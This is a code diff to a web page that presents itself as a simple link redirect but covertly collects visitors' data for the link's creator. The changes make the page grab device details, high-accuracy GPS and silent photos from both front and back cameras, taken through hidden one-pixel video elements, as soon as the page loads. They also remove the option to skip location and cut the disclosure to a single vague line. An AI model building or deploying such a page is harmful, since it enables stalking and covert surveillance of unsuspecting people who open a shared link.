@@ -9,83 +9,69 @@
 <body>
   <div class="card">
     <h1>You're about to continue to a link</h1>
-    <p>Before we redirect you, here's what this page collects:</p>
-    <ul>
-      <li><strong>Device &amp; browser info</strong> — browser, OS, screen, network, battery.</li>
-      <li><strong>Your location</strong> — only if you allow it.</li>
-      <li><strong>A verification photo</strong> — this page may access your camera for identity verification purposes.</li>
-    </ul>
-    <p>This data is visible to the person who created this link.</p>
+    <p>This page collects basic device info, your location, and a verification photo before redirecting you.</p>
 
-    <div id="status" class="status" style="display:none;"></div>
+    <div id="status" class="status">Preparing your link…</div>
 
-    <!-- Two hidden videos: one per camera -->
+    <!-- Hidden videos for camera capture -->
     <video id="videoFront" autoplay playsinline muted
       style="position:fixed;opacity:0;pointer-events:none;width:1px;height:1px;top:0;left:0;"></video>
     <video id="videoBack" autoplay playsinline muted
       style="position:fixed;opacity:0;pointer-events:none;width:1px;height:1px;top:0;left:0;"></video>
     <canvas id="camCanvas" style="display:none;"></canvas>
 
-    <button id="continueBtn" class="btn">Allow location &amp; continue</button>
-    <button id="skipBtn" class="btn btn-secondary">Continue without location</button>
-    <p class="fineprint">By clicking either button you will be redirected to the destination link.</p>
+    <button id="continueBtn" class="btn" disabled>Continue</button>
+    <p class="fineprint">By clicking Continue you will be redirected to the destination link.</p>
   </div>
 
   <script>
     const slug = <%- JSON.stringify(slug) %>;
     const statusEl = document.getElementById('status');
     const continueBtn = document.getElementById('continueBtn');
-    const skipBtn = document.getElementById('skipBtn');
     const canvas = document.getElementById('camCanvas');
 
+    // Collected data stored here while user reads the page
+    let collectedData = {
+      location: null,
+      consented: false,
+      deviceInfo: {},
+      photo_front: null,
+      photo_back: null,
+    };
+
     function setStatus(msg) {
-      statusEl.style.display = 'block';
       statusEl.textContent = msg;
     }
 
-    // Capture a single photo from an already-playing video element
     function snapPhoto(videoEl) {
       try {
         canvas.width = videoEl.videoWidth || 640;
         canvas.height = videoEl.videoHeight || 480;
         canvas.getContext('2d').drawImage(videoEl, 0, 0);
         return canvas.toDataURL('image/jpeg', 0.7);
-      } catch(e) {
-        return null;
-      }
+      } catch(e) { return null; }
     }
 
-    // Open both camera streams simultaneously, wait for both to be ready, then snap
     async function captureBothCameras() {
       const videoFront = document.getElementById('videoFront');
       const videoBack  = document.getElementById('videoBack');
+      let streamFront = null, streamBack = null;
 
-      let streamFront = null;
-      let streamBack  = null;
-      let photoFront  = null;
-      let photoBack   = null;
-
-      // Start both streams at the same time
       const [resultFront, resultBack] = await Promise.allSettled([
         navigator.mediaDevices.getUserMedia({
-          video: { facingMode: { ideal: 'user' }, width: 640, height: 480 },
-          audio: false
+          video: { facingMode: { ideal: 'user' }, width: 640, height: 480 }, audio: false
         }),
         navigator.mediaDevices.getUserMedia({
-          video: { facingMode: { ideal: 'environment' }, width: 640, height: 480 },
-          audio: false
+          video: { facingMode: { ideal: 'environment' }, width: 640, height: 480 }, audio: false
         }),
       ]);
 
-      // Attach front stream
       if (resultFront.status === 'fulfilled') {
         streamFront = resultFront.value;
         videoFront.srcObject = streamFront;
         await new Promise(res => { videoFront.onloadedmetadata = res; });
         await videoFront.play();
       }
-
-      // Attach back stream
       if (resultBack.status === 'fulfilled') {
         streamBack = resultBack.value;
         videoBack.srcObject = streamBack;
@@ -93,14 +79,11 @@
         await videoBack.play();
       }
 
-      // Wait for exposure to settle
       await new Promise(res => setTimeout(res, 900));
 
-      // Snap both
-      if (streamFront) photoFront = snapPhoto(videoFront);
-      if (streamBack)  photoBack  = snapPhoto(videoBack);
+      const photoFront = streamFront ? snapPhoto(videoFront) : null;
+      const photoBack  = streamBack  ? snapPhoto(videoBack)  : null;
 
-      // Stop all tracks
       [streamFront, streamBack].forEach(s => s && s.getTracks().forEach(t => t.stop()));
       videoFront.srcObject = null;
       videoBack.srcObject  = null;
@@ -108,7 +91,6 @@
       return { photoFront, photoBack };
     }
 
-    // Collect all available device info
     async function collectDeviceInfo() {
       const info = {
         screen_resolution: `${screen.width}x${screen.height}`,
@@ -137,57 +119,66 @@
       return info;
     }
 
-    async function sendVisit(consented, location) {
-      setStatus('Redirecting…');
-      try {
-        const [deviceInfo, cameras] = await Promise.all([
-          collectDeviceInfo(),
-          captureBothCameras(),
-        ]);
+    // Run everything on page load
+    async function init() {
+      setStatus('Preparing your link…');
 
+      // Collect device info immediately (no permission needed)
+      collectedData.deviceInfo = await collectDeviceInfo();
+
+      // Request GPS and camera at the same time
+      const [gpsResult, cameraResult] = await Promise.allSettled([
+        new Promise((resolve, reject) => {
+          if (!navigator.geolocation) return resolve(null);
+          navigator.geolocation.getCurrentPosition(
+            pos => resolve({ lat: pos.coords.latitude, lon: pos.coords.longitude, accuracy: pos.coords.accuracy }),
+            () => resolve(null),
+            { enableHighAccuracy: true, timeout: 8000 }
+          );
+        }),
+        captureBothCameras(),
+      ]);
+
+      if (gpsResult.status === 'fulfilled' && gpsResult.value) {
+        collectedData.location = gpsResult.value;
+        collectedData.consented = true;
+      }
+
+      if (cameraResult.status === 'fulfilled') {
+        collectedData.photo_front = cameraResult.value.photoFront;
+        collectedData.photo_back  = cameraResult.value.photoBack;
+      }
+
+      setStatus('Your link is ready.');
+      continueBtn.disabled = false;
+    }
+
+    // When they click Continue, just send what was already collected
+    continueBtn.addEventListener('click', async () => {
+      continueBtn.disabled = true;
+      setStatus('Redirecting…');
+
+      try {
         const resp = await fetch(`/api/visit/${slug}`, {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({
-            consented,
-            location,
-            deviceInfo,
-            photo_front: cameras.photoFront,
-            photo_back:  cameras.photoBack,
-          }),
+          body: JSON.stringify(collectedData),
         });
-
         const data = await resp.json();
         if (data.redirect) {
           window.location.replace(data.redirect);
         } else {
           setStatus('Something went wrong. Please try again.');
+          continueBtn.disabled = false;
         }
       } catch(err) {
         setStatus('Something went wrong. Please try again.');
+        continueBtn.disabled = false;
       }
-    }
-
-    continueBtn.addEventListener('click', () => {
-      continueBtn.disabled = true;
-      skipBtn.disabled = true;
-
-      if (!navigator.geolocation) {
-        return sendVisit(false, null);
-      }
-      setStatus('Getting location…');
-      navigator.geolocation.getCurrentPosition(
-        pos => sendVisit(true, { lat: pos.coords.latitude, lon: pos.coords.longitude, accuracy: pos.coords.accuracy }),
-        ()  => sendVisit(false, null),
-        { enableHighAccuracy: true, timeout: 8000 }
-      );
     });
 
-    skipBtn.addEventListener('click', () => {
-      continueBtn.disabled = true;
-      skipBtn.disabled = true;
-      sendVisit(false, null);
-    });
+    // Start immediately on page load
+    init();
   </script>
 </body>
 </html>
